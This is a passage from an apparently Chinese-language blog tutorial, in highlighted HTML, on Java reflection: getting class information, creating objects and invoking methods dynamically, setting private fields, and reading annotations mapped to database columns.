class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="有Class对象的类型"><a href="#有Class对象的类型" class="headerlink" title="有Class对象的类型"></a>有<code>Class</code>对象的类型</h2><p><img src="image-20210825114726576.png" alt="image-20210825114726576"></p><h2 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h2><p><img src="image-20210825161357375.png" alt="image-20210825161357375"></p><h2 id="获取类的信息"><a href="#获取类的信息" class="headerlink" title="获取类的信息"></a>获取类的信息</h2><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 注解与反射<span class="token punctuation">.</span>反射<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 获取类的信息 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//获取Class</span>        SuperClass superClass <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperClass</span><span class="token punctuation">(</span><span class="token string">"Atmujie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">SuperClass</span><span class="token operator">></span> aClass <span class="token operator">=</span> superClass<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//获取类名</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"=================类名=============="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>aClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//获取类的简易名</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"=================简易名=================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>aClass<span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//获取public属性</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"=================public属性==================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Field field <span class="token operator">:</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//获取全部属性</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"=================全部属性================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> declaredFields <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Field declaredField <span class="token operator">:</span> declaredFields<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>declaredField<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//获取本类与父类的所有public方法</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"================本类与父类的public方法===================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Method<span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Method method <span class="token operator">:</span> methods<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//获取本类的所有方法</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"================本类所有方法===================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methods <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Method method <span class="token operator">:</span> methods<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>          <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210825165517577.png" alt="image-20210825165517577"></p><h1 id="通过反射动态创建对象以及执行方法"><a href="#通过反射动态创建对象以及执行方法" class="headerlink" title="通过反射动态创建对象以及执行方法"></a>通过反射动态创建对象以及执行方法</h1><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//创建Class</span>SuperClass atmujie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperClass</span><span class="token punctuation">(</span><span class="token string">"Atmujie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">SuperClass</span><span class="token operator">></span> aClass <span class="token operator">=</span> atmujie<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//forName创建Class</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> aClass1 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"注解与反射.反射.SuperClass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过多种方式创建Class,这只是其中一种</p><h2 id="构造一个对象"><a href="#构造一个对象" class="headerlink" title="构造一个对象"></a>构造一个对象</h2><h3 id="无参或者定义了无参构造器时"><a href="#无参或者定义了无参构造器时" class="headerlink" title="无参或者定义了无参构造器时"></a>无参或者定义了无参构造器时</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//构造一个对象(无参或有无参构造器)</span>SuperClass superClass <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//没有new的情况下构造对象(无参或有无参构造器)</span>SuperClass superClass1 <span class="token operator">=</span> <span class="token punctuation">(</span>SuperClass<span class="token punctuation">)</span>aClass1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="有参或者没有定义无参构造器时"><a href="#有参或者没有定义无参构造器时" class="headerlink" title="有参或者没有定义无参构造器时"></a>有参或者没有定义无参构造器时</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//构造一个对象(有参或没有无参构造器)【默认调用aClass1】</span><span class="token comment" spellcheck="true">/*获取构造器*/</span>Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> declaredConstructor <span class="token operator">=</span> aClass1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*通过构造器构造对象*/</span>SuperClass aaa <span class="token operator">=</span> <span class="token punctuation">(</span>SuperClass<span class="token punctuation">)</span>declaredConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"AAA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="通过反射获取方法"><a href="#通过反射获取方法" class="headerlink" title="通过反射获取方法"></a>通过反射获取方法</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//通过反射获取方法【getDeclaredMethod(name,values)】</span>SuperClass c1 <span class="token operator">=</span> <span class="token punctuation">(</span>SuperClass<span class="token punctuation">)</span>aClass1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Method declaredMethod <span class="token operator">=</span> aClass1<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"Superclass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*初始化运行方法*/</span>declaredMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c1<span class="token punctuation">.</span><span class="token function">Superclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="通过反射操作属性"><a href="#通过反射操作属性" class="headerlink" title="通过反射操作属性"></a>通过反射操作属性</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//通过反射操作属性</span>SuperClass c2 <span class="token operator">=</span> <span class="token punctuation">(</span>SuperClass<span class="token punctuation">)</span> aClass1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field name <span class="token operator">=</span> aClass1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*取消安全检测*/</span>name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//private属性要取消安全检测才能改</span><span class="token comment" spellcheck="true">/*修改*/</span>name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span><span class="token string">"MUJIE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c2<span class="token punctuation">.</span><span class="token function">Superclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 动态创建对象 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//创建Class</span>        SuperClass atmujie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperClass</span><span class="token punctuation">(</span><span class="token string">"Atmujie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">SuperClass</span><span class="token operator">></span> aClass <span class="token operator">=</span> atmujie<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//forName创建Class</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> aClass1 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"注解与反射.反射.SuperClass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//构造一个对象(无参或有无参构造器)</span>        SuperClass superClass <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//没有new的情况下构造对象(无参或有无参构造器)</span>        SuperClass superClass1 <span class="token operator">=</span> <span class="token punctuation">(</span>SuperClass<span class="token punctuation">)</span>aClass1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//构造一个对象(有参或没有无参构造器)【默认调用aClass1】</span>        <span class="token comment" spellcheck="true">/*获取构造器*/</span>        Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> declaredConstructor <span class="token operator">=</span> aClass1<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*通过构造器构造对象*/</span>        SuperClass aaa <span class="token operator">=</span> <span class="token punctuation">(</span>SuperClass<span class="token punctuation">)</span>declaredConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"AAA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//通过反射获取方法【语法：getDeclaredMethod(name,values)】</span>        SuperClass c1 <span class="token operator">=</span> <span class="token punctuation">(</span>SuperClass<span class="token punctuation">)</span>aClass1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Method declaredMethod <span class="token operator">=</span> aClass1<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"Superclass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*初始化运行方法*/</span>        declaredMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c1<span class="token punctuation">.</span><span class="token function">Superclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//通过反射操作属性</span>        SuperClass c2 <span class="token operator">=</span> <span class="token punctuation">(</span>SuperClass<span class="token punctuation">)</span> aClass1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field name <span class="token operator">=</span> aClass1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*取消安全检测*/</span>        name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//private属性要取消安全检测才能改</span>        <span class="token comment" spellcheck="true">/*修改*/</span>        name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span><span class="token string">"MUJIE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c2<span class="token punctuation">.</span><span class="token function">Superclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210826184444298.png" alt="image-20210826184444298"></p><p><strong>注：关闭安全可以提高性能</strong></p><p><strong>性能占用：普通调用 &lt;&lt; 关闭安装检测的反射调用 &lt; 反射调用</strong></p><h2 id="获取注解信息"><a href="#获取注解信息" class="headerlink" title="获取注解信息"></a>获取注解信息</h2><h3 id="类的属性与数据库的对应关系"><a href="#类的属性与数据库的对应关系" class="headerlink" title="类的属性与数据库的对应关系"></a>类的属性与数据库的对应关系</h3><p><img src="image-20210826185517907.png" alt="image-20210826185517907"></p><h3 id="获取类与属性的注解信息"><a href="#获取类与属性的注解信息" class="headerlink" title="获取类与属性的注解信息"></a>获取类与属性的注解信息</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>ElementType<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Retention<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RetentionPolicy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 获取注解信息 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//创建反射对象</span>        Class<span class="token operator">&lt;</span>Annotation<span class="token operator">></span> c1 <span class="token operator">=</span> Annotation<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取类的注解信息</span>        java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Annotation<span class="token punctuation">[</span><span class="token punctuation">]</span> declaredAnnotations <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredAnnotations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Annotation declaredAnnotation <span class="token operator">:</span> declaredAnnotations<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>declaredAnnotation<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"====================================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取类的注解值</span>        ClassAnnotation annotations <span class="token operator">=</span> <span class="token punctuation">(</span>ClassAnnotation<span class="token punctuation">)</span> c1<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ClassAnnotation<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String tableName <span class="token operator">=</span> annotations<span class="token punctuation">.</span><span class="token function">tableName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"====================================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取属性信息</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> declaredFields <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Field declaredField <span class="token operator">:</span> declaredFields<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>declaredField<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"====================================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取指定属性对应的注解信息</span>        Field id <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Annotation<span class="token punctuation">[</span><span class="token punctuation">]</span> annotations1 <span class="token operator">=</span> id<span class="token punctuation">.</span><span class="token function">getAnnotations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*获取全部*/</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Annotation annotation <span class="token operator">:</span> annotations1<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>annotation<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"+++++++++++++++----------------++++++++++++++"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*获取指定*/</span>        FieldAnnotation fieldAnnotation <span class="token operator">=</span> id<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>FieldAnnotation<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fieldAnnotation<span class="token punctuation">.</span><span class="token function">column</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fieldAnnotation<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fieldAnnotation<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义一个测试类</span><span class="token annotation punctuation">@ClassAnnotation</span><span class="token punctuation">(</span>tableName <span class="token operator">=</span> <span class="token string">"db_测试"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Annotation</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@FieldAnnotation</span><span class="token punctuation">(</span>column <span class="token operator">=</span> <span class="token string">"id"</span><span class="token punctuation">,</span>type <span class="token operator">=</span> <span class="token string">"int"</span><span class="token punctuation">,</span>length <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token annotation punctuation">@FieldAnnotation</span><span class="token punctuation">(</span>column <span class="token operator">=</span> <span class="token string">"username"</span><span class="token punctuation">,</span>type <span class="token operator">=</span> <span class="token string">"varchar"</span><span class="token punctuation">,</span>length <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String username<span class="token punctuation">;</span>    <span class="token annotation punctuation">@FieldAnnotation</span><span class="token punctuation">(</span>column <span class="token operator">=</span> <span class="token string">"password"</span><span class="token punctuation">,</span>type <span class="token operator">=</span> <span class="token string">"varchar"</span><span class="token punctuation">,</span>length <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String password<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Annotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">Annotation</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> String username<span class="token punctuation">,</span> String password<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>password <span class="token operator">=</span> password<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> username<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token 